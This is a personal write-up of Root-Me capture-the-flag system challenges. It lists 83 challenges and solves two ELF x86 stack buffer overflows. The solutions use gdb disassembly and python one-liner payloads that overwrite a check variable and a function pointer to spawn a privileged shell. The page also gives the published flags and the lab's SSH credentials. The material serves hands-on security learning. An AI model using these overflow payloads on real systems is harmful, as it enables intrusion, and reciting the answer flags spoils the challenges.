# [Root-Me](./rootme.md) Root-Me App - System Challenges [1/83]

These challenges will help you understand applicative vulnerabilities. 

## Contents

1. [ELF x86 - Stack buffer overflow basic 1](#elf-x86-stack-buffer-overflow-basic-1) 🗸
2. [ELF x86 - Stack buffer overflow basic 2](#elf-x86-stack-buffer-overflow-basic-2)
3. [PE32 - Stack buffer overflow basic](#pe32-stack-buffer-overflow-basic)
4. [ELF x86 - Format string bug basic 1](#elf-x86-format-string-bug-basic-1)
5. [ELF x64 - Stack buffer overflow - basic](#elf-x64-stack-buffer-overflow-basic)
6. [ELF x86 - Format string bug basic 2](#elf-x86-format-string-bug-basic-2)
7. [ELF x86 - Race condition](#elf-x86-race-condition)
8. [ELF ARM - Stack buffer overflow - basic](#elf-arm-stack-buffer-overflow-basic)
9. [ELF MIPS - Stack buffer overflow - No NX](#elf-mips-stack-buffer-overflow-no-nx)
10. [ELF x64 - Double free](#elf-x64-double-free)
11. [ELF x86 - Stack buffer overflow basic 3](#elf-x86-stack-buffer-overflow-basic-3)
12. [ELF x86 - Use After Free - basic](#elf-x86-use-after-free-basic)
13. [ELF ARM - Stack Spraying](#elf-arm-stack-spraying)
14. [ELF x64 - Stack buffer overflow - PIE](#elf-x64-stack-buffer-overflow-pie)
15. [ELF x86 - BSS buffer overflow](#elf-x86-bss-buffer-overflow)
16. [ELF x86 - Stack buffer overflow basic 4](#elf-x86-stack-buffer-overflow-basic-4)
17. [ELF x86 - Stack buffer overflow basic 6](#elf-x86-stack-buffer-overflow-basic-6)
18. [ELF x86 - Format String Bug Basic 3](#elf-x86-format-string-bug-basic-3)
19. [PE32 - Advanced stack buffer overflow](#pe32-advanced-stack-buffer-overflow)
20. [ELF ARM - Basic ROP](#elf-arm-basic-rop)
21. [ELF MIPS - Basic ROP](#elf-mips-basic-rop)
22. [ELF x86 - Stack buffer overflow - C++ vtables](#elf-x86-stack-buffer-overflow-cpp-vtables)
23. [PE32+ Format string bug](#pe32-format-string-bug)
24. [ELF x64 - Logic bug](#elf-x64-logic-bug)
25. [ELF x86 - Bug Hunting - Several issues](#elf-x86-bug-hunting-several-issues)
26. [ELF x86 - Stack buffer and integer overflow](#elf-x86-stack-buffer-and-integer-overflow)
27. [ELF x86 - Stack buffer overflow - ret2dl_resolve](#elf-x86-stack-buffer-overflow-ret2dl-resolve)
28. [ELF x86 - Stack buffer overflow basic 5](#elf-x86-stack-buffer-overflow-basic-5)
29. [ELF x64 - Stack buffer overflow - advanced](#elf-x64-stack-buffer-overflow-advanced)
30. [ELF MIPS - Format String Glitch](#elf-mips-format-string-glitch)
31. [ELF x64 - Heap Filling](#elf-x64-heap-filling)
32. [ELF x86 - Information leakage with Stack Smashing Protector](#elf-x86-information-leakage-with-stack-smashing-protector)
33. [ELF x64 - File Structure Hacking](#elf-x64-file-structure-hacking)
34. [ELF ARM - Race condition](#elf-arm-race-condition)
35. [ELF x64 - Browser exploit - Intro](#elf-x64-browser-exploit-intro)
36. [ELF x64 - Heap Safe-Linking Bypass](#elf-x64-heap-safe-linking-bypass)
37. [ELF x64 - ret2dl_init](#elf-x64-ret2dl-init)
38. [ELF x86 - Out of bounds attack - French Paradox](#elf-x86-out-of-bounds-attack-french-paradox)
39. [ELF x86 - Remote BSS buffer overflow](#elf-x86-remote-bss-buffer-overflow)
40. [ELF x86 - Remote Format String bug](#elf-x86-remote-format-string-bug)
41. [PE32+ Basic ROP](#pe32-basic-rop)
42. [ELF x64 - Remote heap buffer overflow - fastbin](#elf-x64-remote-heap-buffer-overflow-fastbin)
43. [ELF x86 - Blind remote format string bug](#elf-x86-blind-remote-format-string-bug)
44. [LinKern ARM - vulnerable syscall](#linkern-arm-vulnerable-syscall)
45. [LinKern x86 - Buffer overflow basic 1](#linkern-x86-buffer-overflow-basic-1)
46. [LinKern x86 - Null pointer dereference](#linkern-x86-null-pointer-dereference)
47. [LinKern x64 - Race condition](#linkern-x64-race-condition)
48. [ELF ARM - Alphanumeric shellcode](#elf-arm-alphanumeric-shellcode)
49. [ELF MIPS - URLEncoded Format String bug](#elf-mips-urlencoded-format-string-bug)
50. [ELF x86 - Hardened binary 1](#elf-x86-hardened-binary-1)
51. [ELF x86 - Hardened binary 2](#elf-x86-hardened-binary-2)
52. [ELF x86 - Hardened binary 3](#elf-x86-hardened-binary-3)
53. [ELF x86 - Hardened binary 4](#elf-x86-hardened-binary-4)
54. [LinKern MIPSel - Vulnerable ioctl](#linkern-mipsel-vulnerable-ioctl)
55. [LinKern x64 - reentrant code](#linkern-x64-reentrant-code)
56. [ELF ARM - Heap format string bug](#elf-arm-heap-format-string-bug)
57. [ELF x64 - Sigreturn Oriented Programming](#elf-x64-sigreturn-oriented-programming)
58. [ELF ARM - Format String bug](#elf-arm-format-string-bug)
59. [ELF ARM - Use After Free](#elf-arm-use-after-free)
60. [ELF x64 - FILE structure hijacking](#elf-x64-file-structure-hijacking)
61. [ELF x64 - Heap feng-shui](#elf-x64-heap-feng-shui)
62. [ELF x64 - Off-by-one bug](#elf-x64-off-by-one-bug)
63. [ELF x86 - Hardened binary 5](#elf-x86-hardened-binary-5)
64. [LinKern ARM - Stack Overflow](#linkern-arm-stack-overflow)
65. [LinKern x86 - basic ROP](#linkern-x86-basic-rop)
66. [ELF ARM - Heap Off-by-One](#elf-arm-heap-off-by-one)
67. [ELF x64 - Remote Heap buffer overflow 1](#elf-x64-remote-heap-buffer-overflow-1)
68. [ELF x86 - Hardened binary 6](#elf-x86-hardened-binary-6)
69. [ELF x86 - Hardened binary 7](#elf-x86-hardened-binary-7)
70. [ELF x86 - Remote stack buffer overflow - Hardened](#elf-x86-remote-stack-buffer-overflow-hardened)
71. [LinKern x64 - RowHammer](#linkern-x64-rowhammer)
72. [LinKern x64 - SLUB off-by-one](#linkern-x64-slub-off-by-one)
73. [ELF ARM - Heap buffer overflow - Wilderness](#elf-arm-heap-buffer-overflow-wilderness)
74. [ELF ARM - Heap Overflow](#elf-arm-heap-overflow)
75. [ELF x64 - Seccomp Whitelist](#elf-x64-seccomp-whitelist)
76. [ELF x86 - Blind ROP](#elf-x86-blind-rop)
77. [Linkern x64 - Memory exploration](#linkern-x64-memory-exploration)
78. [WinKern x64 - Advanced stack buffer overflow - ROP](#winkern-x64-advanced-stack-buffer-overflow-rop)
79. [WinKern x64 - Use After Free](#winkern-x64-use-after-free)
80. [ELF x64 - Remote Heap buffer overflow 2](#elf-x64-remote-heap-buffer-overflow-2)
81. [ELF x64 - Advanced Heap Exploitation - Heap Leakless & Fortified](#elf-x64-advanced-heap-exploitation-heap-leakless-fortified)
82. [ELF x64 - Blind ROP](#elf-x64-blind-rop)
83. [ELF x64 - Browser exploit - BitString](#elf-x64-browser-exploit-bitstring)

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ELF x86 Stack buffer overflow basic 1

- Author: Lyes
- Date: 25 March 2015
- Points: 5
- Level: 1

### Statement

Environment configuration:

<details>

<summary markdown="span">Source Code</summary>

~~~c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
     
int main()
{
     
  int var;
  int check = 0x04030201;
  char buf[40];
     
  fgets(buf,45,stdin);
     
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
  
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  
  if (check == 0xdeadbeef)
  {
    printf("Yeah dude! You win!\nOpening your shell...\n");
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
    printf("Shell closed! Bye.\n");
  }
  return 0;
}
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch13@challenge02.root-me.org 
- Username: app-systeme-ch13
- Password: app-systeme-ch13

### Resources

1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
2. [buffering in standard streams](https://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf).
3. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buf variable:

~~~c
char buf[40];     
fgets(buf,45,stdin);
~~~

The variable buf is allocated 40 Bytes but the fgets reads 45 Bytes in.  We can overflow the buf buffer and write into the stack.

Connecting, we can see the vulnerability:

~~~shell
app-systeme-ch13@challenge02:~$ ./ch13
0000000000000000000000000000000000000000000000

[buf]: 000000000000000000000000000000000000000000000
[check] 0x3030303030

You are on the right way!
app-systeme-ch13@challenge02:~$ ./ch13
0000000000000000000000000000000000000000111111

[buf]: 000000000000000000000000000000000000000011111
[check] 0x3131313131

You are on the right way!
~~~

We can see the overflow checks the check variable which is manipulated by the trailing characters (0x31 = "1").  We ncan check the endian-ness of the buffer:

~~~shell
app-systeme-ch13@challenge02:~$ ./ch13
000000000000000000000000000000000000000012345

[buf]: 00000000000000000000000000000000000000001234
[check] 0x34333231

You are on the right way!
~~~
  
This shows us the variable is little-endian.  We need to append a 5-byte statement to generate a correct little-endian value as detailed in the source code:

~~~c
if (check == 0xdeadbeef)
~~~

We can use python to insert the hex chars:

~~~shell
app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")') | ./ch13

[buf]: 0000000000000000000000000000000000000000ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
~~~

This opens a shell and immediately closes it.  We need to interrupt it using cat:

~~~shell
app-systeme-ch13@challenge02:~$ (python -c 'print("0"*40+"\xef\xbe\xad\xde")'; cat) | ./ch13

[buf]: 0000000000000000000000000000000000000000ﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
ls
ch13  ch13.c  Makefile
strings .passwd
1w4ntm0r3pr0np1s
exit
Shell closed! Bye.
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
1w4ntm0r3pr0np1s
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ELF x86 Stack buffer overflow basic 2

- Author: Lyes
- Date: 10 April 2015
- Points: 10
- Level: 1

### Statement

<details>

<summary markdown="span">Source Code</summary>

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
     
void shell() {
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
     
void sup() {
  printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
     
void main()
{
  int var;
  void (*func)()=sup;
  char buf[128];
  fgets(buf,133,stdin);
  func();
}
~~~

</details>

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port:2222
- SSH access: ssh -p 2222 app-systeme-ch15@challenge02.root-me.org 
- Username: app-systeme-ch15
- Password: app-systeme-ch15

### Resources

1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
2. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).
3. [64 bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see the vulnerability in the buf variable:

~~~c
char buf[128];
fgets(buf,133,stdin);
~~~

The variable buf is allocated 128 Bytes but the fgets reads 133 Bytes in.  We can overflow the buf buffer and write into the stack.  We can also see a call to the bash shell in shell().  We need to call that instead of funcP{

Connecting, we can see the vulnerability:

~~~shell
$ ssh -p 2222 app-systeme-ch15@challenge02.root-me.org
app-systeme-ch15@challenge02:~$ ls
ch15  ch15.c  Makefile
app-systeme-ch15@challenge02:~$ ./ch15
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 
app-systeme-ch15@challenge02:~$ ./ch15
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012345
Segmentation fault
~~~

We can decompile in gdb to find the address of the shell() function:

~~~shell
app-systeme-ch15@challenge02:~$ gdb ch15
gdb) run
Starting program: /challenge/app-systeme/ch15/ch15 
1
Hey dude ! Waaaaazzaaaaaaaa ?!
[Inferior 1 (process 24071) exited with code 037]
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048584 <+0>:	lea    0x4(%esp),%ecx
   0x08048588 <+4>:	and    $0xfffffff0,%esp
   0x0804858b <+7>:	pushl  -0x4(%ecx)
   0x0804858e <+10>:	push   %ebp
   0x0804858f <+11>:	mov    %esp,%ebp
   0x08048591 <+13>:	push   %ebx
   0x08048592 <+14>:	push   %ecx
   0x08048593 <+15>:	sub    $0x90,%esp
   0x08048599 <+21>:	call   0x80485de <__x86.get_pc_thunk.ax>
   0x0804859e <+26>:	add    $0x1a62,%eax
   0x080485a3 <+31>:	lea    -0x1aa7(%eax),%edx
   0x080485a9 <+37>:	mov    %edx,-0xc(%ebp)
   0x080485ac <+40>:	mov    -0x4(%eax),%edx
   0x080485b2 <+46>:	mov    (%edx),%edx
   0x080485b4 <+48>:	sub    $0x4,%esp
   0x080485b7 <+51>:	push   %edx
   0x080485b8 <+52>:	push   $0x85
   0x080485bd <+57>:	lea    -0x8c(%ebp),%edx
   0x080485c3 <+63>:	push   %edx
   0x080485c4 <+64>:	mov    %eax,%ebx
   0x080485c6 <+66>:	call   0x8048390 <fgets@plt>
   0x080485cb <+71>:	add    $0x10,%esp
   0x080485ce <+74>:	mov    -0xc(%ebp),%eax
   0x080485d1 <+77>:	call   *%eax
   0x080485d3 <+79>:	nop
   0x080485d4 <+80>:	lea    -0x8(%ebp),%esp
   0x080485d7 <+83>:	pop    %ecx
   0x080485d8 <+84>:	pop    %ebx
   0x080485d9 <+85>:	pop    %ebp
   0x080485da <+86>:	lea    -0x4(%ecx),%esp
   0x080485dd <+89>:	ret    
End of assembler dump.
~~~
  
We can look at the memory address for shell:

~~~shell
(gdb) disassemble shell
Dump of assembler code for function shell:
   0x08048516 <+0>:	push   ebp
   0x08048517 <+1>:	mov    ebp,esp
   0x08048519 <+3>:	push   esi
   0x0804851a <+4>:	push   ebx
   0x0804851b <+5>:	call   0x8048450 <__x86.get_pc_thunk.bx>
   0x08048520 <+10>:	add    ebx,0x1ae0
   0x08048526 <+16>:	call   0x80483a0 <geteuid@plt>
   0x0804852b <+21>:	mov    esi,eax
   0x0804852d <+23>:	call   0x80483a0 <geteuid@plt>
   0x08048532 <+28>:	sub    esp,0x8
   0x08048535 <+31>:	push   esi
   0x08048536 <+32>:	push   eax
   0x08048537 <+33>:	call   0x80483d0 <setreuid@plt>
   0x0804853c <+38>:	add    esp,0x10
   0x0804853f <+41>:	sub    esp,0xc
   0x08048542 <+44>:	lea    eax,[ebx-0x1990]
   0x08048548 <+50>:	push   eax
   0x08048549 <+51>:	call   0x80483c0 <system@plt>
   0x0804854e <+56>:	add    esp,0x10
   0x08048551 <+59>:	nop
   0x08048552 <+60>:	lea    esp,[ebp-0x8]
   0x08048555 <+63>:	pop    ebx
   0x08048556 <+64>:	pop    esi
   0x08048557 <+65>:	pop    ebp
   0x08048558 <+66>:	ret    
End of assembler dump.
~~~

We need to call address 0x08048516:

~~~shell
app-systeme-ch15@challenge02:~$ (python -c 'print("0"*128+"\x16\x85\x04\x08")'; cat) | ./ch15

ls
ch15  ch15.c  Makefile
whoami
app-systeme-ch15-cracked
strings .passwd
B33r1sSoG0oD4y0urBr4iN
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
B33r1sSoG0oD4y0urBr4iN
~~~

</details>

---

### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

Last updated Jan 2021.

## [djm89uk.github.io](https://djm89uk.github.io)
